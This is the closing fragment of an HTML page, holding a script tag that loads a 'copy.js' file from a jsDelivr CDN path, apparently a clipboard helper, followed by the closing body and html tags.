    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>



  





</body>

</html>
